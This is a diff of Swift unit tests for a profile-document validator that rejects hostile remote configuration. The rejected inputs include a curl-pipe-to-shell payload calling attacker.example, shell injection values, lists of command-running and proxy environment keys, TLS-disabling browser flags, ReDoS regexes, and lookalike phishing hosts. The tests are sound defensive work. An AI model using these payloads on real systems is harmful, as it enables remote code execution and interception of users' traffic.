@@ -207,9 +207,101 @@ final class ProfilesDocumentTests: XCTestCase {
                           with: .invalidField("apps.com.example.app.args[0]"))
         }
         let allowed = try makeProfilesData(apps: ["com.example.app": appEntry(extra: [
-            "args": ["--enable-features=Foo", "--force-dark-mode", "-new-instance", "--homepage-flag"],
+            "args": ["--disable-gpu", "--force-dark-mode", "-new-instance", "--homepage-flag"],
             "env": ["ELECTRON_ENABLE_LOGGING": "1", "HOMEBREW_NO_ANALYTICS": "1", "DYLDX": "1"],
         ])])
         XCTAssertNoThrow(try ProfilesDocument.decodeValidated(from: allowed))
+    }
+
+    func testRejectsRestrictedNewWindowCommands() throws {
+        // Security audit C1: a remote profile may only plant {target} / open templates with plain flags.
+        let payload = #"/bin/sh -c curl${IFS}-fsSL${IFS}https://attacker.example/p|sh"#
+        for command in [payload, "/bin/sh -c id", "open -na {target}", "{target} $(id)", "{target} -n;id",
+                        "/usr/bin/open -na {target} --args --user-data-dir=/tmp/x"] {
+            assertRejects(try makeProfilesData(apps: ["com.example.app": appEntry(extra: ["newWindowCommand": command])]),
+                          with: .invalidField("apps.com.example.app.newWindowCommand"))
+        }
+        for command in ["/usr/bin/open -na {target} --args --new-window", "{target} --new-window"] {
+            let data = try makeProfilesData(apps: ["com.example.app": appEntry(extra: ["newWindowCommand": command])])
+            XCTAssertEqual(try ProfilesDocument.decodeValidated(from: data).apps["com.example.app"]?.newWindowCommand, command)
+        }
+    }
+
+    func testRejectsCommandRunningEnvironmentAndTrafficInterception() throws {
+        // Security audit C2: env keys that run commands in child processes or intercept traffic.
+        for key in ["GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0", "GIT_SSH_COMMAND", "PERL5OPT", "PERL5LIB",
+                    "PYTHONSTARTUP", "PYTHONPATH", "RUBYOPT", "RUBYLIB", "LESSOPEN", "LESSSECURE", "NODE_PATH", "NODE_DEBUG",
+                    "BASH_ENV", "ENV", "ZDOTDIR", "SSLKEYLOGFILE", "NODE_TLS_REJECT_UNAUTHORIZED", "NODE_EXTRA_CA_CERTS",
+                    "PATH", "SHELL", "TMPDIR", "XDG_CONFIG_HOME", "XDG_DATA_HOME",
+                    "HTTPS_PROXY", "HTTP_PROXY", "ALL_PROXY", "NO_PROXY", "all_proxy", "https_Proxy", "FTP_PROXY"] {
+            assertRejects(try makeProfilesData(apps: ["com.example.app": appEntry(extra: ["env": [key: "x"]])]),
+                          with: .invalidField("apps.com.example.app.env.\(key)"))
+        }
+        for argument in ["--proxy-server=http://x", "--proxy-pac-url=http://x/p.pac", "--proxy-bypass-list=*",
+                         "--host-resolver-rules=MAP * x", "--host-rules=MAP * x", "--ignore-certificate-errors",
+                         "--ssl-key-log-file=/tmp/k", "--allow-running-insecure-content",
+                         "--unsafely-treat-insecure-origin-as-secure=http://x", "--disable-features=Foo",
+                         "--enable-features=Foo", "--js-flags=--expose-gc", "--allow-file-access-from-files",
+                         "-proxy-server=x", "--PROXY-SERVER=x", "-enable-features=Foo"] {
+            assertRejects(try makeProfilesData(apps: ["com.example.app": appEntry(extra: ["args": [argument]])]),
+                          with: .invalidField("apps.com.example.app.args[0]"))
+        }
+    }
+
+    func testRejectsArgumentsWithControlCharacters() throws {
+        for argument in ["--ok\u{0}", "--ok\n--inspect", "--ok\t", "--ok\u{1B}[0m", "--ok\u{7F}", "\r--ok"] {
+            assertRejects(try makeProfilesData(apps: ["com.example.app": appEntry(extra: ["args": [argument]])]),
+                          with: .invalidField("apps.com.example.app.args[0]"))
+        }
+    }
+
+    func testBenignEnvironmentAndSwitchesStayAccepted() throws {
+        let data = try makeProfilesData(apps: ["com.example.app": appEntry(extra: [
+            "args": ["--disable-gpu", "--force-dark-mode", "--lang=en-US"],
+            "env": ["ELECTRON_ENABLE_LOGGING": "1", "HOMEBREW_NO_ANALYTICS": "1", "LANG": "en_US.UTF-8", "PROXYLESS": "1"],
+        ])])
+        XCTAssertNoThrow(try ProfilesDocument.decodeValidated(from: data))
+    }
+
+    func testRejectsUnsafeBadgeRegexAndAcceptsOrdinaryOnes() throws {
+        for pattern in ["^(.+)+X$", "(a*)*", "(a)\\1", "(?<=a)b", String(repeating: "a", count: 300)] {
+            assertRejects(try makeProfilesData(webApps: ["whatsapp": webAppEntry(extra: ["badgeRegex": pattern])]),
+                          with: .invalidField("webApps.whatsapp.badgeRegex"))
+        }
+        for pattern in [#"\((\d+)\)"#, "(\\d+)"] {
+            let data = try makeProfilesData(webApps: ["whatsapp": webAppEntry(extra: ["badgeRegex": pattern])])
+            XCTAssertEqual(try ProfilesDocument.decodeValidated(from: data).webApps["whatsapp"]?.badgeRegex, pattern)
+        }
+    }
+
+    func testRejectsSingleLabelAndPublicSuffixExtraHosts() throws {
+        // Security audit C8: an extra host is trusted with all its subdomains.
+        for host in ["com", "co.uk", "github.io", "herokuapp.com", "localhost"] {
+            assertRejects(try makeProfilesData(webApps: ["whatsapp": webAppEntry(extra: ["extraHosts": ["whatsapp.com", host]])]),
+                          with: .invalidField("webApps.whatsapp.extraHosts[1]"))
+        }
+        let data = try makeProfilesData(webApps: ["whatsapp": webAppEntry(extra: ["extraHosts": ["foo.github.io", "example.co.uk"]])])
+        XCTAssertNoThrow(try ProfilesDocument.decodeValidated(from: data))
+    }
+
+    func testRejectsBundledPresetIdsPointedAtAnotherHost() throws {
+        // Security audit C9: a remote document must not repoint whatsapp/teams/outlook at an attacker's site.
+        for (key, url) in [("whatsapp", "https://evil.example/"), ("whatsapp", "https://web.whatsapp.com.evil.example/"),
+                           ("teams", "https://teams.evil.example/"), ("outlook", "https://outlook.office.com.evil.example/mail/")] {
+            assertRejects(try makeProfilesData(webApps: [key: webAppEntry(extra: ["url": url])]),
+                          with: .invalidField("webApps.\(key).url"))
+        }
+        // The bundled hosts themselves, including a different path, still validate.
+        let data = try makeProfilesData(webApps: [
+            "whatsapp": webAppEntry(),
+            "teams": webAppEntry(extra: ["url": "https://TEAMS.microsoft.com/v2/"]),
+            "outlook": webAppEntry(extra: ["url": "https://outlook.office.com/mail/"]),
+        ])
+        XCTAssertNoThrow(try ProfilesDocument.decodeValidated(from: data))
+    }
+
+    func testAcceptsNewPresetIdsOnAnyHttpsHost() throws {
+        let data = try makeProfilesData(webApps: ["signal": webAppEntry(extra: ["name": "Signal", "url": "https://app.example.org/"])])
+        XCTAssertEqual(try ProfilesDocument.decodeValidated(from: data).webApps["signal"]?.url, "https://app.example.org/")
     }
 }
